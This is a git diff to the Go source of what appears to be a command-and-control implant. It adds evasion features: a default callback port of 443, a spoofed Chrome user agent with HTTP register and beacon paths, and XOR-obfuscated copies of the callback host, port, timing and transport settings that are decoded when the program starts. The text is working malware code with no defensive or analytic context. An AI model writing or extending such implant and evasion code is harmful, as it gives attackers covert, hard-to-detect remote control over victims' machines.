@@ -34,16 +34,40 @@ import (
 // Build-time variables — overridden with -ldflags at generate time.
 var (
 	lhost             = "127.0.0.1"
-	lport             = "4444"
+	lport             = "443"
 	interval          = "60"
 	jitter            = "20"
 	transport         = "tcp" // "tcp" or "http"
 	serverFingerprint = ""    // leave empty to skip pinning (dev/test only)
+
+	// HTTP transport customisation — set via 'generate --http-ua / --http-*-path'.
+	httpUA           = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+	httpRegisterPath = "/register"
+	httpBeaconPath   = "/beacon/"
+
+	// Obfuscated variants — set by 'generate --obfuscate'.
+	// When present these override the plain vars above.
+	xorKey               = ""
+	lhostEnc             = ""
+	lportEnc             = ""
+	intervalEnc          = ""
+	jitterEnc            = ""
+	transportEnc         = ""
+	serverFingerprintEnc = ""
 )
 
 const agentVersion = "v3"
 
 func main() {
+	// Resolve obfuscated config vars if enc variants are present.
+	// This overwrites the plain ldflags vars so all downstream code is unaffected.
+	lhost = resolveVar(lhost, lhostEnc, xorKey)
+	lport = resolveVar(lport, lportEnc, xorKey)
+	interval = resolveVar(interval, intervalEnc, xorKey)
+	jitter = resolveVar(jitter, jitterEnc, xorKey)
+	transport = resolveVar(transport, transportEnc, xorKey)
+	serverFingerprint = resolveVar(serverFingerprint, serverFingerprintEnc, xorKey)
+
 	h := buildHello()
 	ivSec := parseInt(interval, 60)
 	jitPct := parseInt(jitter, 20)
